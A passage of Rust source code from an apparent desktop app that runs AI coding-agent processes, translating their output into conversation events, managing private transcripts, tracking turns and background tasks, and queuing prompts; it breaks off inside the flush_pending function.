//! Conversation commands and events around agent processes. Provider adapters normalize external
//! protocols into V1 for transcripts, the UI and relay viewers. Commands share one pipe; processes
//! can survive between turns, while transcripts survive the processes. Claude stream-json and Codex
//! JSON-RPC remain confined to their adapters.

use crate::i18n;
use crate::lock::lock;
use crate::state::{publish, Note, Status, Workspace};
use crate::{accounts, claude, codex, conversation, paths, transcript, usage, AppState};
use serde_json::{json, Value};
use std::io::{BufRead, BufReader, Read, Write};
use std::os::unix::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::{ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tauri::{AppHandle, Emitter, Manager, State};

/// Serialize accepted input per conversation without blocking sends to unrelated agents.
pub(crate) fn input_gate(session: &str) -> Arc<Mutex<()>> {
    type Gates = Mutex<std::collections::HashMap<String, Arc<Mutex<()>>>>;
    static GATES: std::sync::OnceLock<Gates> = std::sync::OnceLock::new();
    lock(GATES.get_or_init(Mutex::default))
        .entry(session.into())
        .or_default()
        .clone()
}

/// Background tasks observed for one conversation, and the completion they hold back. A provider's
/// native subagents outlive the turn that started them, so a conversation only settles when the
/// turn has ended *and* those tasks have drained. Runtime only: tasks die with the process.
#[derive(Default)]
pub struct Work {
    running: usize,
    /// A turn ended while tasks were still running.
    held: bool,
}

impl Work {
    /// Apply a canonical event. `true` when the conversation settles on it: the turn has ended and
    /// no background task is still running. Both adapters feed this through the same two events.
    pub(crate) fn observe(&mut self, event: &Value) -> bool {
        // The main agent answering again invalidates the terminal its children were holding, or a
        // later drain would settle the conversation in the middle of the resumed turn.
        if conversation::agent_activity(event) {
            self.held = false;
            return false;
        }
        match event["type"].as_str() {
            // An interruption ends the turn and the children it started, whether or not the
            // provider reports the drain. Nothing may hold the conversation open afterwards.
            Some("turn.completed") if event["outcome"] == "interrupted" => {
                *self = Self::default();
                true
            }
            Some("turn.completed") => self.ended(),
            Some("background.changed") => {
                self.reported(event["tasks"].as_array().map_or(0, Vec::len))
            }
            _ => false,
        }
    }

    /// The turn ended. `true` when the conversation settles now.
    fn ended(&mut self) -> bool {
        self.held = self.running > 0;
        !self.held
    }

    /// An adapter reported the current tasks. `true` when a held completion settles now.
    fn reported(&mut self, running: usize) -> bool {
        self.running = running;
        let settled = running == 0 && self.held;
        self.held = self.held && !settled;
        settled
    }
}

impl Work {
    /// Background tasks this conversation still owes, independently of its main turn.
    fn busy(&self) -> bool {
        self.running > 0
    }
}

/// Background work a conversation still owes, without creating bookkeeping for an unknown one.
fn busy(app: &AppHandle, id: &str) -> bool {
    lock(&app.state::<AppState>().work)
        .get(id)
        .is_some_and(Work::busy)
}

/// Read and update one conversation's background bookkeeping.
fn work<T>(app: &AppHandle, id: &str, change: impl FnOnce(&mut Work) -> T) -> T {
    let state = app.state::<AppState>();
    let mut tracked = lock(&state.work);
    change(tracked.entry(id.to_string()).or_default())
}

/// Per-tab memory limit; trim only complete JSON lines.
const KEEP: usize = 4 * 1024 * 1024;

/// Grace periods after stdin closes, before escalating to SIGTERM and SIGKILL.
const GRACE: Duration = Duration::from_secs(2);
const REAP: Duration = Duration::from_millis(500);

/// Stored lines and their transport sequence, shared under one lock. Snapshots identify exactly
/// which live events they already contain, as in `pty::Scroll`.
#[derive(Default)]
pub struct Lines {
    pub text: String,
    pub seq: u64,
}

impl Lines {
    /// Keep the transcript, sequence and live emission in one critical section.
    fn deliver(&mut self, text: &str, persist: bool, log: Option<&Path>, emit: impl FnOnce(u64)) {
        let seq = if persist {
            if let Some(log) = log {
                append(log, text);
            }
            self.absorb(text)
        } else {
            self.skip()
        };
        emit(seq);
    }

    /// Block incoming events until a successful command and its local events are recorded.
    fn command(
        &mut self,
        command: &Value,
        send: impl FnOnce(&str) -> Result<Vec<Value>, String>,
        mut record: impl FnMut(&mut Self, &Value),
    ) -> Result<Vec<Value>, String> {
        let echo = send(&self.text)?;
        // Publish accepted app input separately from user events, which providers can also synthesize.
        let started = (command["type"] == "message.send").then(|| {
            conversation::event(
                "session.state",
                conversation::now(),
                json!({ "state": "busy" }),
            )
        });
        let event = match command["type"].as_str() {
            Some("message.send") => command["text"].as_str().map(user),
            _ => closed_request(command),
        };
        let events: Vec<Value> = started.into_iter().chain(event).chain(echo).collect();
        for event in &events {
            record(self, event);
        }
        Ok(events)
    }

    /// Append a line, trim complete lines above the limit and return its sequence.
    pub fn absorb(&mut self, line: &str) -> u64 {
        self.text.push_str(line);
        self.text.push('\n');
        if self.text.len() > KEEP {
            let cut = self.text.len() - KEEP;
            let at = self.text.as_bytes()[cut..]
                .iter()
                .position(|&b| b == b'\n')
                .map_or(self.text.len(), |i| cut + i + 1);
            self.text.drain(..at);
        }
        self.seq += 1;
        self.seq
    }

    /// Number a live event without retaining it. Streaming deltas are replaced by complete
    /// assistant blocks.
    pub fn skip(&mut self) -> u64 {
        self.seq += 1;
        self.seq
    }

    /// Load the transcript tail for local replay and remote snapshots. New process output uses the
    /// same format.
    fn seeded(path: &Path) -> Lines {
        let mut text = std::fs::read_to_string(path).unwrap_or_default();
        if text.len() > KEEP {
            let cut = text.len() - KEEP;
            let at = text.as_bytes()[cut..]
                .iter()
                .position(|&b| b == b'\n')
                .map_or(text.len(), |i| cut + i + 1);
            text.drain(..at);
        }
        if !text.is_empty() && !text.ends_with('\n') {
            text.push('\n');
        }
        Lines { text, seq: 0 }
    }
}

/// The transcript snapshot and its last transport sequence.
#[derive(serde::Serialize)]
pub struct Snapshot {
    pub text: String,
    pub seq: u64,
}

/// Provider-specific input adapters accepting the same V1 command contract.
pub enum Wire {
    Claude(claude::Link),
    Codex(Arc<Mutex<codex::Link>>),
    Antigravity(Arc<Mutex<crate::antigravity::Link>>),
}

/// Translate each provider output line into zero or more canonical V1 events.
pub type Translate = Box<dyn FnMut(&str) -> Vec<String> + Send>;

/// Drain each output pipe independently of translation and publication locks. A bounded channel
/// could fill while stdin waits for the child, recreating the pipe deadlock.
/// ponytail: queued output has no memory ceiling during stalls; spool to disk if measured stalls
/// require a bound.
fn output_lines(output: impl Read + Send + 'static) -> std::sync::mpsc::IntoIter<String> {
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        for line in BufReader::new(output).lines().map_while(Result::ok) {
            if tx.send(line).is_err() {
                break;
            }
        }
    });
    rx.into_iter()
}

/// Process-boundary configuration: stderr filtering and the provider's input/output adapters.
pub(crate) struct ProcessIo<F> {
    stderr_line: fn(&str) -> Option<String>,
    wire: F,
    profile: accounts::Profile,
}

impl<F> ProcessIo<F> {
    pub(crate) fn new(
        stderr_line: fn(&str) -> Option<String>,
        wire: F,
        profile: accounts::Profile,
    ) -> Self {
        Self {
            stderr_line,
            wire,
            profile,
        }
    }
}

/// Shared event delivery for process output and locally generated events, including adapter
/// responses such as `/context`. Each clone uses the same transcript buffer and sequence.
#[derive(Clone)]
pub struct Pump {
    /// Serialize capture with publication, then commit outside transcript and chat locks.
    telemetry: Arc<Mutex<crate::telemetry::Capture>>,
    app: AppHandle,
    id: String,
    sink: Arc<Mutex<Lines>>,
    /// Stop replaced processes from emitting into their successor's conversation.
    gone: Arc<AtomicBool>,
    /// A message starts a turn; `turn.completed` ends it. Snapshots include this runtime state
    /// because transcript lines alone do not retain every ephemeral process event.
    turn: Arc<AtomicBool>,
    /// Whether the initial command list has arrived; see `react`.
    ready: Arc<AtomicBool>,
    /// Optional app-managed transcript. Claude writes its own; Codex V1 events are persisted here
    /// for replay.
    log: Option<PathBuf>,
    profile: accounts::Profile,
}

impl Pump {
    /// Record and emit one valid JSON event, then apply reactions outside the transcript lock.
    pub fn feed(&self, text: &str) {
        if self.gone.load(Ordering::Relaxed) {
            return;
        }
        let text = text.trim_end();
        if text.is_empty() {
            return;
        }
        let Ok(frame) = serde_json::from_str::<Value>(text) else {
            return;
        };
        {
            let mut capture = lock(&self.telemetry);
            {
                let mut lines = lock(&self.sink);
                self.record(&mut lines, text, &frame);
            }
            if !self.gone.load(Ordering::Relaxed) {
                capture.observe(&mut lock(&self.app.state::<AppState>().telemetry), &frame);
            }
        }
        self.react(&frame);
    }

    fn record(&self, lines: &mut Lines, text: &str, frame: &Value) {
        if frame["type"] == "telemetry.usage" {
            return;
        }
        let public = public_text(text, frame);
        let text = public.as_ref();
        if self.gone.load(Ordering::Relaxed) {
            return;
        }
        // Completion ends a turn. Background activity can start another without a new user message.
        match frame["type"].as_str() {
            Some("turn.completed") => self.turn.store(false, Ordering::Relaxed),
            Some("assistant.block" | "assistant.started") => {
                self.turn.store(true, Ordering::Relaxed)
            }
            _ => {}
        }
        crate::delegation::observe(&self.app, &self.id, frame);
        lines.deliver(text, keep(frame), self.log.as_deref(), |seq| {
            if !self.gone.load(Ordering::Relaxed) {
                let _ = self
                    .app
                    .emit("chat", (self.id.clone(), text.to_string(), seq));
            }
        });
    }

    fn react(&self, frame: &Value) {
        if self.gone.load(Ordering::Relaxed) {
            return;
        }
        crate::delegation::publish_observation(&self.app, &self.id, frame);
        // A turn that ends with subagents still running is not an opening for queued input.
        if react(&self.app, &self.id, frame, &self.ready, &self.profile) {
            let state = self.app.state::<AppState>();
            let queued = lock(&state.board)
                .tab_mut(&self.id)
                .is_some_and(|tab| tab.pending_prompt.is_some());
            if queued && !setup_running(&state, &self.id) {
                let (app, id) = (self.app.clone(), self.id.clone());
                std::thread::spawn(move || send_prompt(&app, &id, None));
            }
        }
    }
}

/// Local measurements stop before conversation persistence and sharing. The original frame still
/// reaches telemetry capture after publication; existing public completion fields stay intact.
fn public_text<'a>(text: &'a str, frame: &Value) -> std::borrow::Cow<'a, str> {
    if frame.get("telemetry").is_none() && frame.get("providerDurationMs").is_none() {
        return std::borrow::Cow::Borrowed(text);
    }
    let mut public = frame.clone();
    if let Some(fields) = public.as_object_mut() {
        fields.remove("telemetry");
        fields.remove("providerDurationMs");
    }
    std::borrow::Cow::Owned(public.to_string())
}

/// Append a private transcript line. Disk failures are logged while live display continues; prompts
/// and tool results can contain secrets.
fn append(path: &Path, line: &str) {
    let write = || -> Result<(), String> {
        if let Some(dir) = path.parent() {
            paths::ensure_private_dir(dir)?;
        }
        let mut options = std::fs::OpenOptions::new();
        options.append(true).create(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.mode(0o600);
        }
        let mut file = options.open(path).map_err(|error| error.to_string())?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            file.set_permissions(std::fs::Permissions::from_mode(0o600))
                .map_err(|error| error.to_string())?;
        }
        writeln!(file, "{line}").map_err(|error| error.to_string())
    };
    if let Err(error) = write() {
        eprintln!("não gravei o transcript {}: {error}", path.display());
    }
}

pub struct Chat {
    wire: Wire,
    pump: Pump,
    pub buffer: Arc<Mutex<Lines>>,
    /// The process is running. Stopped entries remain in the map for conversation replay.
    alive: Arc<AtomicBool>,
    pid: u32,
}

impl Chat {
    /// Translate and send one V1 command. Return any canonical events produced locally by the
    /// adapter. The caller supplies the current transcript while holding its ordering lock.
    pub fn write(&mut self, frame: &Value, buffer: &str) -> Result<Vec<Value>, String> {
        match &mut self.wire {
            Wire::Claude(link) => link.write(frame, buffer),
            Wire::Codex(link) => lock(link).write(frame),
            Wire::Antigravity(link) => {
                if frame["v"] == 1 && frame["type"] == "turn.interrupt" {
                    let events = lock(link).interrupted();
                    crate::pty::signal_group(self.pid, &self.alive, libc::SIGINT);
                    Ok(events)
                } else {
                    lock(link).write(frame)
                }
            }
        }
    }

    pub fn alive(&self) -> bool {
        self.alive.load(Ordering::Relaxed)
    }

    /// Deliver an app-generated warning into the conversation as a `system.notice`, the same path
    /// provider stderr takes, so it reaches the timeline and the transcript buffer.
    pub fn warn(&self, code: &str, detail: &str) {
        self.pump.feed(
            &conversation::event(
                "system.notice",
                conversation::now(),
                json!({ "level": "warning", "code": code, "detail": detail }),
            )
            .to_string(),
        );
    }

    fn changing_account(&self) -> Result<bool, String> {
        let selected = accounts::active(self.pump.profile.provider)?;
        if accounts::logging_in(&selected.id) {
            return Err(i18n::t("err.account.busy"));
        }
        Ok(selected.id != self.pump.profile.id || selected.revision != self.pump.profile.revision)
    }

    pub fn account(&self) -> &str {
        &self.pump.profile.id
    }

    fn waits_for_turn(&self) -> bool {
        matches!(&self.wire, Wire::Antigravity(_)) && self.working()
    }

    /// Work the conversation owes: its main turn, or the children that outlived one. Restarting the
    /// process or replacing credentials under either kills or corrupts work in flight.
    pub fn working(&self) -> bool {
        self.pump.turn.load(Ordering::Relaxed) || busy(&self.pump.app, &self.pump.id)
    }

    /// The agent's process group leader; resource accounting includes its descendants.
    pub fn pid(&self) -> u32 {
        self.pid
    }
}

/// Dropping closes stdin, then escalates to SIGTERM and SIGKILL for the entire process group.
impl Drop for Chat {
    fn drop(&mut self) {
        self.pump.gone.store(true, Ordering::Relaxed);
        // Claude stdin closes with the Chat. Codex's reader still owns its adapter, so close that
        // stdin explicitly.
        if let Wire::Antigravity(link) = &self.wire {
            lock(link).close();
        }
        if let Wire::Codex(link) = &self.wire {
            lock(link).close();
        }
        let (pid, alive) = (self.pid, self.alive.clone());
        std::thread::spawn(move || {
            if crate::pty::wait_exit(&alive, GRACE) {
                return;
            }
            crate::pty::signal_group(pid, &alive, libc::SIGTERM);
            if crate::pty::wait_exit(&alive, REAP) {
                return;
            }
            crate::pty::signal_group(pid, &alive, libc::SIGKILL);
        });
    }
}

/// Removing the conversation drops its process handle and starts shutdown.
pub fn kill(state: &AppState, id: &str) {
    crate::embedded_mcp::revoke(id);
    lock(&state.chats).remove(id);
    crate::delegation::stopped(state, id);
}

/// Remove inherited `CLAUDE*` variables without clearing caller-supplied environment values.
fn drop_claude_vars(cmd: &mut Command) {
    let explicit: std::collections::HashSet<_> =
        cmd.get_envs().map(|(key, _)| key.to_os_string()).collect();
    for (key, _) in std::env::vars() {
        if key.starts_with("CLAUDE") && !explicit.contains(std::ffi::OsStr::new(&key)) {
            cmd.env_remove(key);
        }
    }
}

/// Start an adapted agent process with a transcript seed and optional app-managed log.
/// The provider supplies both input translation and stdout translation through `ProcessIo`.
pub(crate) fn launch(
    app: &AppHandle,
    id: &str,
    mut cmd: Command,
    seed: &Path,
    log: Option<PathBuf>,
    spawn_error: &str,
    io: ProcessIo<impl FnOnce(ChildStdin) -> (Wire, Translate)>,
) -> Result<Chat, String> {
    let ProcessIo {
        stderr_line,
        wire,
        profile,
    } = io;
    cmd.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    // Inherited CLAUDE_CODE_CHILD_SESSION disables nested Claude transcript saving. Remove
    // inherited Claude flags while preserving PATH and caller-supplied MCP authentication
    // environment values.
    drop_claude_vars(&mut cmd);
    // Use a separate process group so shutdown can reach descendants.
    cmd.process_group(0);

    let mut child = cmd
        .spawn()
        .map_err(|e| i18n::ta(spawn_error, &[("cause", e.to_string())]))?;
    let pid = child.id();
    let stdin = child.stdin.take().ok_or_else(|| i18n::t("err.chat.pipe"))?;
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| i18n::t("err.chat.pipe"))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| i18n::t("err.chat.pipe"))?;
    let stdout = output_lines(stdout);
    let stderr = output_lines(stderr);
    let (wire, mut translate) = wire(stdin);

    let pump = Pump {
        telemetry: Arc::new(Mutex::new(crate::telemetry::Capture::default())),
        app: app.clone(),
        id: id.to_string(),
        sink: Arc::new(Mutex::new(Lines::seeded(seed))),
        gone: Arc::new(AtomicBool::new(false)),
        turn: Arc::new(AtomicBool::new(false)),
        ready: Arc::new(AtomicBool::new(false)),
        log,
        profile,
    };
    let mut chat = Chat {
        wire,
        buffer: pump.sink.clone(),
        alive: Arc::new(AtomicBool::new(true)),
        pid,
        pump: pump.clone(),
    };
    // A replacement process has no background tasks from its predecessor.
    pump.feed(
        &conversation::event(
            "session.state",
            conversation::now(),
            json!({ "state": "starting" }),
        )
        .to_string(),
    );
    // Request slash-command metadata before the first prompt. Claude's stream init requires a
    // prompt; Codex handles initialization in its adapter.
    match chat.write(&json!({ "v": 1, "type": "commands.list" }), "") {
        Ok(echo) => {
            for frame in echo {
                pump.feed(&frame.to_string());
            }
        }
        Err(e) => eprintln!("initialize em {id}: {e}"),
    }

    // Accepted stderr lines become conversation notices, including missing sessions or
    // authentication. Codex filters logs that duplicate JSON-RPC events.
    {
        let pump = pump.clone();
        std::thread::spawn(move || {
            for line in stderr {
                let Some(line) = stderr_line(&line) else {
                    continue;
                };
                if line.trim().is_empty() {
                    continue;
                }
                pump.feed(
                    &conversation::event(
                        "system.notice",
                        conversation::now(),
                        json!({ "level": "error", "code": "provider.stderr", "detail": line }),
                    )
                    .to_string(),
                );
            }
        });
    }

    let alive = chat.alive.clone();
    std::thread::spawn(move || {
        for line in stdout {
            for frame in translate(line.trim_end()) {
                pump.feed(&frame);
            }
        }
        // Stop signaling before reaping the child, since the OS may reuse its PID after wait
        // returns.
        alive.store(false, Ordering::Relaxed);
        let _ = child.wait();
        let (app, id) = (pump.app, pump.id);
        let state = app.state::<AppState>();
        // A replacement can start while the old child exits. Compare process identity under the
        // chats lock and keep that lock through cleanup so an old exit cannot stop its successor or
        // clear its readiness.
        let chats = lock(&state.chats);
        if !same_process(chats.get(&id).map(|chat| &chat.alive), &alive) {
            return;
        }
        lock(&state.ready).remove(&id);
        lock(&state.work).remove(&id);
        crate::delegation::stopped(&state, &id);
        // Keep the conversation available for resume after the process stops.
        update(&app, &id, Some(Status::Desligada), Note::Clear, None);
        let _ = app.emit("chat-closed", id);
    });

    Ok(chat)
}

/// Compare process identity, not its alive value: separate stopped processes both contain `false`.
fn same_process(current: Option<&Arc<AtomicBool>>, ended: &Arc<AtomicBool>) -> bool {
    current.is_some_and(|current| Arc::ptr_eq(current, ended))
}

/// Persist replayable conversation events. Streaming deltas and transient context, identity,
/// commands and usage events are delivered live without entering the transcript.
fn keep(frame: &Value) -> bool {
    !matches!(
        frame["type"].as_str(),
        Some(
            "assistant.started"
                | "assistant.block.started"
                | "assistant.delta"
                | "tool.input.delta"
                | "context.compaction"
                | "context.updated"
                | "session.state"
                | "session.identity"
                | "commands.updated"
                | "usage.updated"
                | "telemetry.usage"
        )
    )
}

/// Apply canonical events to board activity, pending questions and turn completion. Returns whether
/// the conversation settled on this event: the turn ended and no background task is still running.
fn react(
    app: &AppHandle,
    id: &str,
    frame: &Value,
    ready: &AtomicBool,
    profile: &accounts::Profile,
) -> bool {
    match frame["type"].as_str() {
        // A replacement process inherits no background tasks and no held completion.
        Some("session.state") if frame["state"] == "starting" => {
            lock(&app.state::<AppState>().work).remove(id);
        }
        // The initial command list also confirms control readiness.
        Some("commands.updated") if !ready.swap(true, Ordering::Relaxed) => {
            ready_now(app, id);
        }
        // Usage belongs to the account and is stored by the shared quota subsystem.
        Some("usage.updated") if frame["provider"] == "claude" => {
            usage::claude(app, &profile.id, profile.revision, &frame["usage"])
        }
        Some("usage.updated") if frame["provider"] == "codex" => {
            usage::codex(app, &profile.id, profile.revision, &frame["usage"])
        }
        // Codex reports context size and its external conversation identity.
        Some("context.updated") => {
            update(app, id, None, Note::Keep, frame["used"].as_u64());
        }
        Some("session.identity") => {
            if let Some(session) = frame["providerSession"].as_str() {
                remember_session(app, id, session);
            }
        }
        Some("assistant.block") => {
            let block = &frame["block"];
            match block["kind"].as_str() {
                Some("tool") => update(
                    app,
                    id,
                    Some(Status::Rodando),
                    Note::Set(activity(block)),
                    None,
                ),
                None => update(app, id, Some(Status::Rodando), Note::Keep, None),
                _ => update(app, id, Some(Status::Rodando), Note::Keep, None),
            }
        }
        // Requests can occur even in bypass mode. Canonical kind determines the interaction;
        // tool names only describe approvals.
        Some("request.opened") => {
            let note = match frame["kind"].as_str() {
                Some("question") => frame["input"]["questions"][0]["question"]
                    .as_str()
                    .map(str::to_string)
                    .unwrap_or_else(|| i18n::t("note.question")),
                Some("plan") => i18n::t("note.plan"),
                _ => match frame["tool"].as_str() {
                    Some(tool) => i18n::ta("note.permission", &[("tool", tool.to_string())]),
                    None => i18n::t("note.permissionAny"),
                },
            };
            update(app, id, Some(Status::Querendo), Note::Set(note), None);
        }
        // Clear stale tool activity on completion and refresh context usage from the transcript.
        // The tab keeps working while the turn's subagents run: its status is the agent's observed
        // state, and a green dot over a running child would be a lie.
        Some("turn.completed") => {
            crate::actions::completed(
                app,
                id,
                frame["outcome"] == "error" || frame["outcome"] == "interrupted",
            );
            let settled = work(app, id, |tracked| tracked.observe(frame));
            let status = match settled {
                true => Status::Pronta,
                false => Status::Rodando,
            };
            update(app, id, Some(status), Note::Clear, context(app, id));
            return settled;
        }
        // Draining alone never completes a turn; it only releases one the agent already ended.
        Some("background.changed") => {
            if work(app, id, |tracked| tracked.observe(frame)) {
                update(app, id, Some(Status::Pronta), Note::Clear, context(app, id));
                return true;
            }
        }
        _ => {}
    }
    false
}

/// Build a compact activity label such as `Bash cd /Users/...`.
fn activity(block: &Value) -> String {
    let tool = block["name"].as_str().unwrap_or("");
    let input = &block["input"];
    let detail = [
        "command",
        "file_path",
        "pattern",
        "path",
        "prompt",
        "url",
        "query",
        "description",
    ]
    .iter()
    .find_map(|k| input[k].as_str())
    .unwrap_or("");
    let detail: String = match detail.chars().count() > 70 {
        true => detail.chars().take(69).collect::<String>() + "…",
        false => detail.to_string(),
    };
    format!("{tool} {detail}").trim().to_string()
}

/// Read current context usage from the transcript. `None` preserves the previous estimate.
fn context(app: &AppHandle, session: &str) -> Option<u64> {
    let state = app.state::<AppState>();
    let worktree = lock(&state.board).workspace_of(session)?.worktree.clone();
    transcript::context(&paths::transcript(session, Path::new(&worktree)))
}

/// Remember the provider's conversation identity, including the Codex thread ID required for
/// resume.
fn remember_session(app: &AppHandle, tab: &str, agent_session: &str) {
    let state = app.state::<AppState>();
    {
        let mut board = lock(&state.board);
        let Some(t) = board.tab_mut(tab) else { return };
        if t.agent_session.as_deref() == Some(agent_session) {
            return;
        }
        t.agent_session = Some(agent_session.to_string());
    }
    publish(app);
}

fn update(app: &AppHandle, session: &str, status: Option<Status>, note: Note, tokens: Option<u64>) {
    let state = app.state::<AppState>();
    let looking = lock(&state.looking).clone();
    {
        let mut board = lock(&state.board);
        let Some(ws) = board.workspace_of_mut(session) else {
            return;
        };
        // Completion or a pending question marks an unseen workspace unread; routine running
        // updates do not.
        if matches!(status, Some(Status::Pronta | Status::Querendo))
            && looking.as_deref() != Some(ws.id.as_str())
        {
            ws.unread = true;
        }
        let Some(tab) = ws.tabs.iter_mut().find(|t| t.id == session) else {
            return;
        };
        if let Some(s) = status {
            tab.status = s;
        }
        match note {
            Note::Clear => tab.note = None,
            Note::Set(n) => tab.note = Some(n),
            Note::Keep => {}
        }
        if let Some(tokens) = tokens {
            tab.observe_tokens(tokens);
        }
    }
    publish(app);
}

/// Called after inserting a Chat and its tab. Send queued input once setup finishes. stdin can
/// accept input before protocol initialization; waiting for Claude init would deadlock the first
/// prompt.
pub fn ready_now(app: &AppHandle, session: &str) {
    let state = app.state::<AppState>();
    lock(&state.ready).insert(session.to_string());
    if !setup_running(&state, session) {
        send_prompt(app, session, None);
    }
}

fn setup_running(state: &AppState, session: &str) -> bool {
    // Release the board lock before inspecting PTYs to avoid nested lock ordering.
    let key = lock(&state.board)
        .workspace_of(session)
        .map(|ws| format!("{}:setup", ws.id));
    key.is_some_and(|key| lock(&state.ptys).get(&key).is_some_and(|p| p.alive()))
}

/// Send the tab's queued prompt once. An optional prefix reports setup failure in the same message.
pub fn send_prompt(app: &AppHandle, session: &str, prefix: Option<String>) {
    let state = app.state::<AppState>();
    if lock(&state.chats)
        .get(session)
        .is_some_and(Chat::waits_for_turn)
    {
        return;
    }
    {
        let mut board = lock(&state.board);
        let Some(prompt) = board
            .tab_mut(session)
            .and_then(|tab| tab.pending_prompt.as_mut())
        else {
            return;
        };
        if let Some(prefix) = prefix {
            prompt.insert_str(0, &prefix);
        }
    }
    match account_boundary(&state, session) {
        Ok(AccountBoundary::Wait) => return,
        Ok(AccountBoundary::Restart) => {
            if let Err(error) = crate::session::revive(app, &state, session) {
                update(app, session, None, Note::Set(error.clone()), None);
                let _ = app.emit("account-error", error);
            }
            return;
        }
        Err(error) => {
            let _ = app.emit("account-error", error);
            return;
        }
        Ok(AccountBoundary::Keep) => {}
    }
    let prompt = {
        let mut board = lock(&state.board);
        let Some(tab) = board.tab_mut(session) else {
            return;
        };
        let Some(p) = tab.pending_prompt.take() else {
            return;
        };
        p
    };
    match say(&state, session, &prompt) {
        Ok(()) => update(app, session, Some(Status::Rodando), Note::Clear, None),
        Err(error) => {
            // If the process dies before writing, restore the unrecorded prompt ahead of input
            // queued during the attempt. Preserve message order and pause failing background tasks.
            let mut board = lock(&state.board);
            if let Some(tab) = board.tab_mut(session) {
                if let Some(run) = tab.task.as_mut() {
                    run.paused = true;
                    run.error = Some(error.clone());
                }
                tab.pending_prompt = Some(match tab.pending_prompt.take() {
                    Some(after) => format!("{prompt}\n\n{after}"),
                    None => prompt,
                });
            }
            drop(board);
            publish(app);
            eprintln!("fala pendente em {session}: {error}");
        }
    }
}

/// Build the timestamped V1 user event. Providers do not echo local input, so the app records and
/// shares it.
fn user(text: &str) -> Value {
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0);
    json!({ "v": 1, "type": "user.message", "at": ts, "content": [{ "kind": "text", "text": text }] })
}

/// Hold chats, then transcript, through the command write and its local events. Incoming output
/// cannot overtake the user message. Run reactions only after releasing both locks.
fn write(state: &AppState, session: &str, frame: &Value) -> Result<(), String> {
    write_mode(state, session, frame, false)
}

fn write_mode(
    state: &AppState,
    session: &str,
    frame: &Value,
    idle_only: bool,
) -> Result<(), String> {
    let scope = (frame["type"] == "message.send")
        .then(|| crate::telemetry::conversation_scope(&lock(&state.board), session))
        .flatten();
    let pump = lock(&state.chats)
        .get(session)
        .map(|chat| chat.pump.clone())
        .ok_or_else(|| i18n::t("err.chat.gone"))?;
    if scope.is_some()
        && !lock(&pump.telemetry).initialized()
        && crate::state::persist_now(&pump.app).is_err()
    {
        lock(&state.telemetry).failed();
    }
    let relations = if scope.is_some() {
        crate::telemetry::conversation_relations(&lock(&state.board), session)
    } else {
        vec![]
    };
    let mut capture = lock(&pump.telemetry);
    let generation = lock(&state.telemetry).generation;
    let events = {
        let mut chats = lock(&state.chats);
        let chat = chats
            .get_mut(session)
            .filter(|c| c.alive())
            .ok_or_else(|| i18n::t("err.chat.gone"))?;
        if !Arc::ptr_eq(&pump.telemetry, &chat.pump.telemetry) {
            return Err(i18n::t("err.chat.gone"));
        }
        let mut lines = lock(&pump.sink);
        if idle_only && chat.working() {
            return Err("conversation_busy".into());
        }
        let previous_turn =
            (frame["type"] == "message.send").then(|| pump.turn.swap(true, Ordering::Relaxed));
        let events = match lines.command(
            frame,
            |buffer| chat.write(frame, buffer),
            |lines, event| pump.record(lines, &event.to_string(), event),
        ) {
            Ok(events) => events,
            Err(error) => {
                if let Some(previous) = previous_turn {
                    pump.turn.store(previous, Ordering::Relaxed);
                }
                return Err(error);
            }
        };
        drop(lines);
        events
    };
    {
        let mut telemetry = lock(&state.telemetry);
        if generation == telemetry.generation {
            if let Some((scope, model)) = scope {
                capture.accepted(&mut telemetry, scope, model);
                for event in &relations {
                    telemetry.capture(generation, event);
                }
            }
            for event in &events {
                capture.observe(&mut telemetry, event);
            }
        }
    }
    drop(capture);
    // Reactions may send another command or lock the board; release both locks first.
    for event in events {
        pump.react(&event);
    }
    Ok(())
}

/// Send a prompt and record its matching user event.
fn say(state: &AppState, session: &str, text: &str) -> Result<(), String> {
    let command = json!({ "v": 1, "type": "message.send", "text": text });
    write(state, session, &command)
}

/// Send input immediately when ready, or queue it and resume the existing transcript after process
/// loss.
#[tauri::command]
pub fn chat_send(
    app: AppHandle,
    state: State<AppState>,
    session: String,
    text: String,
) -> Result<(), String> {
    let gate = input_gate(&session);
    let _input = lock(&gate);
    send(app, state, session, text, false)
}

/// Callers hold the session input gate across validation and reservation so person and MCP sends cannot consume
/// each other's execution identifiers. The process write checks idleness again under its lock.
pub(crate) fn send(
    app: AppHandle,
    state: State<AppState>,
    session: String,
    text: String,
    idle_only: bool,
) -> Result<(), String> {
    let text = text.trim().to_string();
    if text.is_empty() {
        return Ok(());
    }
    let boundary = account_boundary(&state, &session)?;
    if boundary == AccountBoundary::Restart {
        kill(&state, &session);
        lock(&state.ready).remove(&session);
        lock(&state.work).remove(&session);
    }
    // Append behind pending setup input without skipping process recovery. A persisted queue may
    // belong to a stopped process, so appending alone must not leave it stuck.
    let queued = {
        let mut board = lock(&state.board);
        board.tab_mut(&session).is_some_and(|tab| {
            tab.pending_prompt.as_mut().is_some_and(|pending| {
                pending.push_str("\n\n");
                pending.push_str(&text);
                true
            })
        })
    };
    let up = lock(&state.chats).get(&session).is_some_and(|c| c.alive());
    let ready = lock(&state.ready).contains(&session);
    let waiting = lock(&state.chats)
        .get(&session)
        .is_some_and(Chat::waits_for_turn);
    if !queued && up && ready && !waiting && boundary != AccountBoundary::Wait {
        write_mode(
            &state,
            &session,
            &json!({"v":1,"type":"message.send","text":text}),
            idle_only,
        )?;
        update(&app, &session, Some(Status::Rodando), Note::Clear, None);
        return Ok(());
    }
    if !queued {
        let mut board = lock(&state.board);
        let Some(tab) = board.tab_mut(&session) else {
            return Err(i18n::t("err.session.noTab"));
        };
        tab.pending_prompt = Some(text);
    }
    // Persist the queue before restarting so a failed spawn leaves input available for retry.
    publish(&app);
    flush_pending(&app, &state, &session)
}

/// Release persisted input while respecting setup and process recovery.
pub fn flush_pending(
    app: &AppHandle,
    state: &State<AppState>,
    session: &str,
) -> Result<(), String> {
